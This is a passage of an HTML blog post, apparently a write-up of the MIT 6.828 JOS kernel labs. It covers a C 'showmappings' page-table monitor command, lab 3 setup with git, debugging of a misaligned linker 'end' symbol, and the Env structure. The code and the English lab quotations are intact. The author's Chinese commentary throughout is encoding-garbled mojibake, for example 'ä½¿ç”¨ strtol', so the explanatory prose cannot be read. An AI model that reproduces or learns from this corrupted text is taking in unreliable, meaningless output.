format all of the physical page mappings (or lack thereof) that apply to a particular range of virtual&#x2F;linear addresses in the currently active address space. For example, you might enter <code>&#39;showmappings 0x3000 0x5000&#39;</code> to display the physical page mappings and corresponding permission bits that apply to the pages at virtual addresses 0x3000, 0x4000, and 0x5000.</li><li>Explicitly set, clear, or change the permissions of any mapping in the current address space.</li><li>Dump the contents of a range of memory given either a virtual or physical address range. Be sure the dump code behaves correctly when the range extends across page boundaries!</li><li>Do anything else that you think might be useful later for debugging the kernel. (Thereâ€™s a good chance it will be!)</li></ul></blockquote><p>ä½¿ç”¨ strtol å°†å­—ç¬¦ä¸²è½¬ä¸ºæ•°å­—åä½¿ç”¨ <code>page_lookup()</code> æŸ¥é˜…é¡µè¡¨åæ‰“å°å³å¯</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">mon_show_mapping</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="keyword">struct</span> Trapframe *tf)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">uintptr_t</span> vstart, vend;</span><br><span class="line"><span class="type">pte_t</span>*pte;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PageInfo</span> *<span class="title">pp</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (argc &lt; <span class="number">3</span>)</span><br><span class="line">&#123;</span><br><span class="line">cprintf(<span class="string">&quot;Usage: showmappings addr_start addr_end\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">vstart = strtol(argv[<span class="number">1</span>], <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">vend = strtol(argv[<span class="number">2</span>], <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (vstart &gt; vend)</span><br><span class="line">&#123;</span><br><span class="line">cprintf(<span class="string">&quot;Invalid start or end address!\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">cprintf(<span class="string">&quot;Virtual address\t\tPhysical Address\n&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (; vstart &lt;= vend; vstart += PGSIZE)</span><br><span class="line">&#123;</span><br><span class="line">cprintf(<span class="string">&quot;  %010p\t\t &quot;</span>, vstart);</span><br><span class="line">pp = page_lookup(kern_pgdir, (<span class="type">void</span>*) vstart, &amp;pte);</span><br><span class="line"><span class="keyword">if</span> (!pte)</span><br><span class="line">cprintf(<span class="string">&quot; Not mapped yet.\n&quot;</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">cprintf(<span class="string">&quot;  %010p\n&quot;</span>, page2pa(pp));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ•ˆæœå¦‚ä¸‹æ‰€ç¤º</p><p><img src="https://s2.loli.net/2022/03/16/Zz7vt2aeMJlUGVD.png" alt="image.png"></p><h3 id="Address-Space-Layout-Alternatives"><a href="#Address-Space-Layout-Alternatives" class="headerlink" title="Address Space Layout Alternatives"></a>Address Space Layout Alternatives</h3><p>å½“å‰çš„ JOS å†…å­˜å¸ƒå±€å¹¶éæ˜¯å”¯ä¸€çš„ä¸€ç§ï¼Œä¸€ä¸ªæ“ä½œç³»ç»Ÿè¿˜èƒ½å°†å†…æ ¸æ˜ å°„åœ¨çº¿æ€§ä½åœ°å€ç©ºé—´ã€è€Œå°†çº¿æ€§é«˜åœ°å€ç©ºé—´ç»™ç”¨æˆ·è¿›ç¨‹ä½¿ç”¨ï¼Œä½†ç”±äº x86çš„ä¸€ç§å‘åå…¼å®¹æ¨¡å¼â€”â€”è™šæ‹Ÿ 8086 æ¨¡å¼å°†å¤„ç†å™¨â€œç¡¬è¿çº¿â€åˆ°çº¿æ€§åœ°å€ç©ºé—´åº•éƒ¨ï¼Œå› æ­¤è‹¥å†…æ ¸æ˜ å°„åˆ°æ­¤å¤„åˆ™å®Œå…¨ä¸å¯ç”¨</p><p>è™½ç„¶è¿™å¯èƒ½æ¯”æƒ³è±¡ä¸­å›°éš¾ï¼Œä½†æˆ‘ä»¬ä»ç„¶æœ‰èƒ½å°†å†…æ ¸æ˜ å°„åˆ°ä½çº¿æ€§åœ°å€ç©ºé—´çš„æ–¹æ¡ˆâ€”â€”å…è®¸ç”¨æˆ·è¿›ç¨‹ç›´æ¥è®¿é—®æ•´ä¸ªåœ°å€ç©ºé—´ï¼Œä½†ä»å°†å†…æ ¸ä¸å„è¿›ç¨‹é—´åˆ†å‰²å¼€æ¥</p><blockquote><p>ç¬”è€…è¯„ä»·ï¼šé—²å¾—æ…Œ</p></blockquote><p>ä¸‹é¢æ˜¯ä¸‰ä¸ª<del>é—²å¾—æ…Œ</del>çš„ Challengeï¼š</p><blockquote><p><em>Challenge!</em> Each user-level environment maps the kernel. Change JOS so that the kernel has its own page table and so that a user-level environment runs with a minimal number of kernel pages mapped. That is, each user-level environment maps just enough pages mapped so that the user-level environment can enter and leave the kernel correctly. You also have to come up with a plan for the kernel to read&#x2F;write arguments to system calls.</p></blockquote><p>å¤§æ¦‚æ˜¯ç»™å†…æ ¸è®¾ç½®ä¸€ä¸ªç‹¬ç«‹çš„é¡µè¡¨ï¼Œè€Œ<strong>ç”¨æˆ·è¿›ç¨‹ä»…ä¿ç•™å¿…é¡»ç”¨åˆ°çš„å†…æ ¸æ˜ å°„ï¼Œä¾‹å¦‚å†…æ ¸å…¥å£ç‚¹</strong>ï¼ˆæ¯”å¦‚è¯´ç³»ç»Ÿè°ƒç”¨ï¼‰ï¼Œç¬”è€…è®¤ä¸ºè¿™ä¸ªå®ç°å·®ä¸å¤šæ˜¯ KPTI çš„æ€æƒ³ï¼Œè¿™é‡Œå°±ä¸æ‰‹æŠ„ä¸€ä»½ KPTI äº†<del>ï¼Œç”¨æˆ·è¿›ç¨‹è¿˜å•¥å½±å­éƒ½æ²¡æœ‰ï¼Œå†™ä¸ªğŸ“</del></p><blockquote><p><em>Challenge!</em> Write up an outline of how a kernel could be designed to allow user environments unrestricted use of the full 4GB virtual and linear address space. Hint: do the previous challenge exercise first, which reduces the kernel to a few mappings in a user environment. Hint: the technique is sometimes known as â€œ<em>follow the bouncing kernel</em>.â€ In your design, be sure to address exactly what has to happen when the processor transitions between kernel and user modes, and how the kernel would accomplish such transitions. Also describe how the kernel would access physical memory and I&#x2F;O devices in this scheme, and how the kernel would access a user environmentâ€™s virtual address space during system calls and the like. Finally, think about and describe the advantages and disadvantages of such a scheme in terms of flexibility, performance, kernel complexity, and other factors you can think of.</p></blockquote><p>å¤§æ¦‚æ˜¯è®¾è®¡ä¸å®ç°ä¸Šé¢çš„æ–¹æ¡ˆï¼Œå¹¶ç¡®ä¿è‡ªå·±æ˜ç¡®å…¶ä¸­çš„ç»†èŠ‚</p><blockquote><p><em>Challenge!</em> Since our JOS kernelâ€™s memory management system only allocates and frees memory on page granularity, we do not have anything comparable to a general-purpose <code>malloc</code>&#x2F;<code>free</code> facility that we can use within the kernel. This could be a problem if we want to support certain types of I&#x2F;O devices that require <em>physically contiguous</em> buffers larger than 4KB in size, or if we want user-level environments, and not just the kernel, to be able to allocate and map 4MB <em>superpages</em> for maximum processor efficiency. (See the earlier challenge problem about PTE_PS.)</p><p>Generalize the kernelâ€™s memory allocation system to support pages of a variety of power-of-two allocation unit sizes from 4KB up to some reasonable maximum of your choice. Be sure you have some way to divide larger allocation units into smaller ones on demand, and to coalesce multiple small allocation units back into larger units when possible. Think about the issues that might arise in such a system.</p></blockquote><p>å®Œå–„å†…æ ¸å†…å­˜ç®¡ç†ç³»ç»Ÿï¼Œæä¾›æ›´å¤§ç²’åº¦ä¸æ›´å°ç²’åº¦çš„ allocatorï¼ˆæ¯”å¦‚è¯´ buddy system + slub allocatorï¼‰ï¼Œè¿™é‡Œå°±ä¸æ‰‹æŠ„ä¸€ä»½ buddy system å’Œ slub allocator äº†ï¼Œç¬”è€…æš‚æ—¶ä¹Ÿæ²¡æœ‰æ›´å¥½çš„å†…å­˜åˆ†é…æ–¹æ¡ˆ</p><blockquote><p><del>ğŸ‘´æ˜¯æ‡’ğŸ•ğŸ‘´è‡ªè±ª</del></p></blockquote><p>è‡³æ­¤ï¼Œlab2 å…¨éƒ¨å®Œæˆ</p><h1 id="0x03-User-Environments"><a href="#0x03-User-Environments" class="headerlink" title="0x03.User Environments"></a>0x03.User Environments</h1><p>åœ¨è¿™ä¸€éƒ¨åˆ†æˆ‘ä»¬ç»ˆäºè¦è¿ˆå…¥ç”¨æˆ·è¿›ç¨‹çš„ä¸–ç•Œï¼Œå®ç°ç‰¹æƒçº§çš„åˆ†ç¦»ï¼Œå¹¶å®Œæˆç³»ç»Ÿè°ƒç”¨çš„ç¼–å†™ä»¥åŠä¸€ä¸ªç”¨æˆ·è¿›ç¨‹çš„è¿è¡Œ</p><p><strong>æ³¨æ„</strong>ï¼šæœ¬ lab ä¸­ <code>environment</code> ä¸ <code>process</code> ä»£æŒ‡åŒä¸€äº‹ç‰©â€”â€”è¿è¡Œçš„è¿›ç¨‹çš„æŠ½è±¡ä½“ï¼Œ6.828 åœ¨è¿™é‡Œæ›´å¤šä½¿ç”¨ environment è€Œä¸æ˜¯ process æ˜¯ä¸ºäº†æŒ‡å‡º JOS environment ä¸ UNIX process æä¾›äº†ä¸åŒçš„æ¥å£ï¼Œä¸”ä¸æä¾›ç›¸åŒçš„è¯­ä¹‰</p><p>é¦–å…ˆæ˜¯æƒ¯ä¾‹åœ°å°† lab 3ä»£ç æ‹‰åˆ°æœ¬åœ°</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git add .</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git commit -am <span class="string">&#x27;changes to lab2 after handin&#x27;</span></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git pull</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git checkout -b lab3 origin/lab3</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git merge lab2</span></span><br></pre></td></tr></table></figure><blockquote><p>è¿™é‡Œç¬”è€…æœ¬æƒ³å…ˆè·‘ä¸€è·‘å†…æ ¸ç©ç©ï¼Œä½†æ˜¯é‡åˆ°ä¸€ä¸ªå¥‡æ€ªçš„é—®é¢˜ï¼šåœ¨åˆ†é…é¡µç›®å½•è¡¨åœ°å€ç©ºé—´åã€å»ºç«‹æ˜ å°„æ—¶ä¼š panic æ‰ï¼Œç»ç¬”è€…è°ƒè¯•å‘ç°åœ¨ boot_alloc() ä¸­åˆå§‹åŒ– nextfree çš„å€¼æ‰€æŒ‡å‘çš„é‚£å¼ å†…å­˜é¡µä¸Š<strong>ä»ç„¶å­˜åœ¨ç€ä¸€äº›å†…æ ¸å˜é‡ï¼Œå³è¿™å¹¶éæ˜¯ä¸€ä¸ªé—²ç½®çš„å†…å­˜é¡µ</strong>ï¼Œäºæ˜¯æˆ‘ä»¬çš„æŒ‡å‘é¡µç›®å½•è¡¨çš„æŒ‡é’ˆå°±è¢« memset æ¸…é›¶äº†â€¦</p><p>ä¸ºä»€ä¹ˆï¼Ÿè®©æˆ‘ä»¬å°†ç›®å…‰æ”¾å› <code>boot_alloc()</code> å‡½æ•°ä¸­ï¼Œåœ¨æˆ‘ä»¬åˆå§‹åŒ– nextfree æ—¶ä½¿ç”¨çš„æ˜¯ä¸€ä¸ªå¤–éƒ¨å¼•å…¥çš„å˜é‡ <code>end</code> å¯¹å†…å­˜é¡µè¿›è¡Œå‘ä¸Šå¯¹é½å¾—åˆ°çš„åœ°å€ï¼Œè¿™é‡Œè¯´æ˜¯ç”±é“¾æ¥å™¨ç”Ÿæˆçš„</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Initialize nextfree if this is the first time.</span></span><br><span class="line"><span class="comment">// &#x27;end&#x27; is a magic symbol automatically generated by the linker,</span></span><br><span class="line"><span class="comment">// which points to the end of the kernel&#x27;s bss segment:</span></span><br><span class="line"><span class="comment">// the first virtual address that the linker did *not* assign</span></span><br><span class="line"><span class="comment">// to any kernel code or global variables.</span></span><br><span class="line"><span class="keyword">if</span> (!nextfree) &#123;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">char</span> end[];</span><br><span class="line">nextfree = ROUNDUP((<span class="type">char</span> *) end, PGSIZE);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>**ä½†ç»è¿‡ç¬”è€…åç¼–è¯‘å†…æ ¸æ–‡ä»¶ã€æ‰“å° end å˜é‡ä¿¡æ¯å‘ç°ï¼Œå…¶å¹¶ä¸æŒ‡å‘ bss çš„æœ«å°¾ï¼Œåé¢è¿˜æœ‰å‡ ä¸ªå˜é‡ï¼Œä¸”å…¶åˆšå¥½è½åœ¨å†…å­˜é¡µå¯¹é½çš„åœ°å€â€¦**è¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆ ROUNDUP ä¸èƒ½é¡ºåˆ©æ‹¯æ•‘ nextfree çš„åŸå› ï¼Œå¯èƒ½ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆä¹‹å‰æ²¡æœ‰å‡ºç°è¯¥é—®é¢˜çš„åŸå› ï¼šä¹‹å‰ end ä¸ä¸€å®šåˆšå¥½è½åœ¨å†…å­˜é¡µå¯¹é½çš„åœ°å€ï¼Œå‘ä¸Šå¯¹é½ä¸€ä¸ªé¡µè‡ªç„¶å°±æ—©å·²è¶…å‡º bss äº†ï¼Œä½†æ˜¯ç°åœ¨é“¾æ¥å™¨æ°å¥½å°†å…¶ç”Ÿæˆåœ¨äº†ä¸€ä¸ªå¾®å¦™çš„ä½ç½®</p><p><img src="https://s2.loli.net/2022/03/16/FzLf8Z39beEkXrH.png" alt="image.png"></p><p><img src="https://s2.loli.net/2022/03/16/1YAmcNrF8h3iLTy.png" alt="image.png"></p><p>ç¬”è€…ç”šè‡³æ€€ç–‘ end å¯èƒ½ä¹‹å‰ç”šè‡³éƒ½ä¸åœ¨ bss æ®µæœ«å°¾ï¼Œå¯èƒ½ä¹Ÿä¸æ˜¯é“¾æ¥å™¨ç”Ÿæˆçš„â€œæœ«å°¾å˜é‡â€â€¦ä½†æ˜¯ä¸€çœ‹ IDA çš„åç¼–è¯‘ç»“æœï¼Œ<strong>å¥½åƒç¡®ä¹æœ‰ä¸ª end åœ¨æ•´ä¸ªé•œåƒçš„æœ€æœ«å°¾ï¼Œä½†ä»–åˆæŒ‡å›äº†é‚£ä¸ªä½ç½®å°´å°¬çš„ end å˜é‡</strong></p><p><img src="https://s2.loli.net/2022/03/16/qDMFGo9v83PAOpY.png" alt="image.png"></p><p>ç¬”è€…æš‚ä¸”ä¸çŸ¥é“æ˜¯ä»€ä¹ˆåŸå› å¯¼è‡´äº†è¿™ä¸ªç°è±¡çš„å‘ç”Ÿï¼Œç›®å‰çš„è§£å†³æ–¹æ¡ˆæ˜¯åœ¨è®¡ç®— nextfree æ—¶å¤šåŠ ä¸€ä¸ª page è¿›è¡Œ ROUNDUPï¼Œ<strong>ä½†åœ¨åé¢çš„ check_kern_pgdir é‡Œé¢åˆ panic æ‰äº†â€¦</strong></p><blockquote><p>lab2 è·‘å¾—å¥½å¥½çš„ lab3 å’‹çªç„¶è«åå…¶å¦™ç‚¸äº†ï¼ŒğŸ‘´ä¸ç†è§£</p></blockquote><p>äºæ˜¯ç¬”è€…<strong>å°† lab2 åˆ†æ”¯çš„ kern&#x2F;pmap.c æ‹·è´è¿‡æ¥ï¼Œè®© end åŠ ä¸Šä¸€ä¸ª pageï¼Œå†…å­˜ç®¡ç†è¿™ä¸€å—åˆä¸€åˆ‡æ­£å¸¸äº†â€¦</strong></p><blockquote><p>ğŸ‘´æ„¿æ„ç§°ä¹‹ä¸ºçµå¼‚äº‹ä»¶</p></blockquote><p>é‚£å°±åªèƒ½æ˜¯ lab3 ä¸­çš„ä¸€äº›æ”¹åŠ¨æŠŠå†…å­˜ç®¡ç†ç»™ crash æ‰äº†ï¼Œç¬”è€…æ£€ç´¢è¯¥å‡½æ•°çš„ panic ä¿¡æ¯ï¼Œå‘ç°ç¡®ä¹æ˜¯åœ¨æ£€æŸ¥ lab3 æ–°å¢çš„å†…å­˜æ˜ å°„åŒºåŸŸæ—¶ panic çš„ï¼ˆè¿™å—å†…å­˜æˆ‘ä»¬è¿˜æ²¡æ˜ å°„ï¼‰</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// check envs array (new test for lab 3)</span></span><br><span class="line">n = ROUNDUP(NENV*<span class="keyword">sizeof</span>(<span class="keyword">struct</span> Env), PGSIZE);</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i += PGSIZE)</span><br><span class="line">assert(check_va2pa(pgdir, UENVS + i) == PADDR(envs) + i);</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥æ¥ä¸‹æ¥é‡æ–°å¼€å§‹ lab3 çš„æ—…ç¨‹</p><blockquote><p>ä½†ğŸ‘´è§‰å¾— end ç¡®ä¹æ˜¯å¯¹é½é”™äº†</p></blockquote></blockquote><p>åœ¨ lab3 ä¸­æ–°å¢äº†ä»¥ä¸‹æ–‡ä»¶ï¼š</p><table><thead><tr><th><code>inc/</code></th><th><code>env.h</code></th><th>Public definitions for user-mode environments</th></tr></thead><tbody><tr><td></td><td><code>trap.h</code></td><td>Public definitions for trap handling</td></tr><tr><td></td><td><code>syscall.h</code></td><td>Public definitions for system calls from user environments to the kernel</td></tr><tr><td></td><td><code>lib.h</code></td><td>Public definitions for the user-mode support library</td></tr><tr><td><code>kern/</code></td><td><code>env.h</code></td><td>Kernel-private definitions for user-mode environments</td></tr><tr><td></td><td><code>env.c</code></td><td>Kernel code implementing user-mode environments</td></tr><tr><td></td><td><code>trap.h</code></td><td>Kernel-private trap handling definitions</td></tr><tr><td></td><td><code>trap.c</code></td><td>Trap handling code</td></tr><tr><td></td><td><code>trapentry.S</code></td><td>Assembly-language trap handler entry-points</td></tr><tr><td></td><td><code>syscall.h</code></td><td>Kernel-private definitions for system call handling</td></tr><tr><td></td><td><code>syscall.c</code></td><td>System call implementation code</td></tr><tr><td><code>lib/</code></td><td><code>Makefrag</code></td><td>Makefile fragment to build user-mode library, <code>obj/lib/libjos.a</code></td></tr><tr><td></td><td><code>entry.S</code></td><td>Assembly-language entry-point for user environments</td></tr><tr><td></td><td><code>libmain.c</code></td><td>User-mode library setup code called from <code>entry.S</code></td></tr><tr><td></td><td><code>syscall.c</code></td><td>User-mode system call stub functions</td></tr><tr><td></td><td><code>console.c</code></td><td>User-mode implementations of <code>putchar</code> and <code>getchar</code>, providing console I&#x2F;O</td></tr><tr><td></td><td><code>exit.c</code></td><td>User-mode implementation of <code>exit</code></td></tr><tr><td></td><td><code>panic.c</code></td><td>User-mode implementation of <code>panic</code></td></tr><tr><td><code>user/</code></td><td><code>*</code></td><td>Various test programs to check kernel lab 3 code</td></tr></tbody></table><h2 id="Part-A-User-Environments-and-Exception-Handling"><a href="#Part-A-User-Environments-and-Exception-Handling" class="headerlink" title="Part A: User Environments and Exception Handling"></a>Part A: User Environments and Exception Handling</h2><p>åœ¨æ–°åŠ å…¥çš„å¤´æ–‡ä»¶ <code>inc/env.h</code> ä¸­åŒ…å«äº† JOS çš„åŸºæœ¬çš„ç”¨æˆ·ç¯å¢ƒå®šä¹‰ï¼Œå†…æ ¸ä½¿ç”¨ç»“æ„ä½“ <code>Env</code> æ¥æ ‡è¯†æ¯ä¸€ä¸ªç”¨æˆ·ç¯å¢ƒï¼Œåœ¨æœ¬ lab ä¸­æˆ‘ä»¬éœ€è¦å®Œæˆ JOS çš„å¤šç¯å¢ƒæ”¯æŒ</p><p>åœ¨ <code>kern/env.c</code> ä¸­ï¼Œå†…æ ¸ç»´æŠ¤ä¸‰ä¸ªä¸ç¯å¢ƒæœ‰å…³çš„å…¨å±€å˜é‡ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Env</span> *<span class="title">envs</span> =</span> <span class="literal">NULL</span>;<span class="comment">// All environments</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Env</span> *<span class="title">curenv</span> =</span> <span class="literal">NULL</span>;<span class="comment">// The current env</span></span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">Env</span> *<span class="title">env_free_list</span>;</span><span class="comment">// Free environment list</span></span><br></pre></td></tr></table></figure><p>åœ¨ JOS å¯åŠ¨æ—¶ä¼šåˆå§‹åŒ–ä¸€ä¸ªé•¿åº¦ä¸º <code>NENV</code> çš„ <code>Env</code> ç»“æ„ä½“æ•°ç»„ï¼Œå…¶ä¸­é—²ç½®çš„ Env ç»“æ„ä½“é“¾åœ¨ <code>env_free_list</code> ä¸­ï¼Œè€Œ <code>curenv</code> æŒ‡å‘å½“å‰ç¯å¢ƒçš„ Env ç»“æ„ä½“ï¼ˆç±»ä¼¼äº Linux å†…æ ¸ä¸­çš„ current() æŒ‡å‘ å½“å‰ CPU ä¸Šè¿è¡Œçš„è¿›ç¨‹çš„ task_structï¼‰ï¼Œåœ¨å¯åŠ¨é˜¶æ®µ curenv ä¸º NULL</p><blockquote><p>ç¬”è€…è®¤ä¸ºè¿˜æ˜¯å«è¿›ç¨‹å¥½å¬ï¼Œæ—¢ç„¶æ˜¯åŒä¸€ä¸ªä¸œè¥¿ï¼Œæ²¡æœ‰å¿…è¦ä¸ºäº†å’Œ UNIX åŒºåˆ†å¼€æ¥è€Œç‰¹æ„æ”¹ä¸ªè«åå…¶å¦™çš„åå­—</p></blockquote><h3 id="Environment-State"><a href="#Environment-State" class="headerlink" title="Environment State"></a>Environment State</h3><p><code>Env</code> ç»“æ„ä½“å®šä¹‰å¦‚ä¸‹ï¼Œç¬”è€…è®¤ä¸ºå¯ä»¥ç±»æ¯”åš Linux ä¸‹çš„ <code>task_struct</code> ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Env</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Trapframe</span> <span class="title">env_tf</span>;</span><span class="comment">// Saved registers</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Env</span> *<span class="title">env_link</span>;</span><span class="comment">// Next free Env</span></span><br><span class="line"><span class="type">envid_t</span> env_id;<span class="comment">// Unique environment identifier</span></span><br><span class="line"><span class="type">envid_t</span> env_parent_id;<span class="comment">// env_id of this env&#x27;s parent</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">EnvType</span> <span class="title">env_type</span>;</span><span class="comment">// Indicates special system environments</span></span><br><span class="line"><span class="type">unsigned</span> env_status;<span class="comment">// Status of the environment</span></span><br><span class="line"><span class="type">uint32_t</span> env_runs;<span class="comment">// Number of times environment has run</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Address space</span></span><br><span class="line"><span class="type">pde_t</span> *env_pgdir;<span class="comment">// Kernel virtual address of page dir</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>å„å­—æ®µè¯´æ˜å¦‚ä¸‹ï¼š</p><ul><li><p><strong>env_tf</strong>: è¿›ç¨‹ä¸Šä¸‹æ–‡ä¸­çš„å¯„å­˜å™¨çŠ¶æ€</p></li><li><p><strong>env_link</strong>: åœ¨ <code>env_free_list</code> é“¾è¡¨ä¸­æŒ‡å‘ä¸‹ä¸€ä¸ªç©ºé—² Env ç»“æ„ä½“</p></li><li><p><strong>env_id</strong>: å”¯ä¸€æ ‡è¯†å•ä¸ªè¿›ç¨‹çš„ idï¼Œåœ¨ Env ç»“æ„ä½“è¢«é‡æ–°åˆ†é…åé€šå¸¸ä¼šå‘ç”Ÿæ”¹å˜</p></li><li><p><strong>env_parent_id</strong>: çˆ¶è¿›ç¨‹çš„ id</p></li><li><p><strong>env_type</strong>: è¿›ç¨‹ç±»å‹ï¼Œå¯¹äºå¤§éƒ¨åˆ†è¿›ç¨‹è€Œè¨€åº”å½“ä¸º <code>ENV_TYPE_USER</code> åœ¨åç»­çš„ lab ä¸­ä¼šè¡¥å……æ›´å¤šçš„ä¸ºç³»ç»ŸæœåŠ¡è€Œå‡ºç°çš„ç±»å‹</p></li></ul><blockquote><p>ç”¨æˆ·è¿›ç¨‹ä¸å†…æ ¸è¿›ç¨‹çš„æ—¢è§†æ„Ÿ</p></blockquote><ul><li><p><strong>env_status</strong>: è¿›ç¨‹çŠ¶æ€ï¼Œå¯é€‰å€¼èŒƒå›´å¦‚ä¸‹ï¼š</p><ul><li><p><code>ENV_FREE</code>: è¯¥ Env ç»“æ„ä½“ç©ºé—²</p></li><li><p><code>ENV_RUNNABLE</code>: è¯¥ Env ç»“æ„ä½“å¯¹åº”ç€ä¸€ä¸ªç­‰å¾…è¿è¡Œçš„è¿›ç¨‹</p></li><li><p><code>ENV_RUNNING</code>: è¯¥ Env ç»“æ„ä½“å¯¹åº”ç€ä¸€ä¸ªæ­£åœ¨è¿è¡Œçš„è¿›ç¨‹</p></li><li><p><code>ENV_NOT_RUNNABLE</code>: è¯¥ Env ç»“æ„ä½“å¯¹åº”è¿›ç¨‹æœªå‡†å¤‡å¥½ç»§ç»­è¿è¡Œï¼ˆä¾‹å¦‚åœ¨ç­‰å¾…å¦ä¸€ä¸ªè¿›ç¨‹çš„ä¿¡å·ï¼‰</p></li><li><p><code>ENV_DYING</code>: è¯¥ Env ç»“æ„ä½“å¯¹åº”ä¸€ä¸ªåƒµå°¸è¿›ç¨‹ï¼Œæˆ‘ä»¬å°†åœ¨ lab4 ä¸­ç”¨åˆ°å®ƒ</p></li></ul></li><li><p><strong>env_pgdir</strong>: è¿›ç¨‹é¡µç›®å½•è¡¨</p></li></ul><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒJOS ä¸­çš„è¿›ç¨‹å¹¶æ²¡æœ‰è‡ªå·±çš„å†…æ ¸æ ˆï¼ŒåŒä¸€æ—¶åˆ»å†…åªæœ‰ä¸€ä¸ªè¿›ç¨‹å¯ä»¥å¤„åœ¨å†…æ ¸æ€ï¼Œæ‰€ä»¥ JOS åªéœ€è¦ä¸€ä¸ªå•ç‹¬çš„å†…æ ¸æ ˆ</p><h3 id="Allocating-the-Environments-Array"><a href="#Allocating-the-Environments-Array" class="headerlink" title="Allocating the Environments Array"></a>Allocating the Environments Array</h3><p>é¦–å…ˆæ˜¯ä¸€ä¸ªå°ç»ƒä¹ ï¼Œåœ¨ <code>mem_init()</code> ä¸­ä¸º envs æ•°ç»„åˆ†é…ç©ºé—´</p><blockquote><p><strong>Exercise 1.</strong> Modify <code>mem_init()</code> in <code>kern/pmap.c</code> to allocate and map the <code>envs</code> array. This array consists of exactly <code>NENV</code> instances of the <code>Env</code> structure allocated much like how you allocated the <code>pages</code> array. Also like the <code>pages</code> array, the memory backing <code>envs</code> should also be mapped user read-only at <code>UENVS</code> (defined in <code>inc/memlayout.h</code>) so user processes can read from this array.</p><p>You should run your code and make sure <code>check_kern_pgdir()</code> succeeds.</p></blockquote><p>æ³¨æ„åº”åœ¨ <code>page_init()</code> ä¹‹å‰è°ƒç”¨ <code>boot_alloc()</code> åˆ†é…ç©ºé—´ï¼Œåœ¨è¿™ä¹‹åå†è¿›è¡Œæ˜ å°„ï¼Œä¸è¦å›¾çœäº‹å†™åˆ°ä¸€èµ·</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 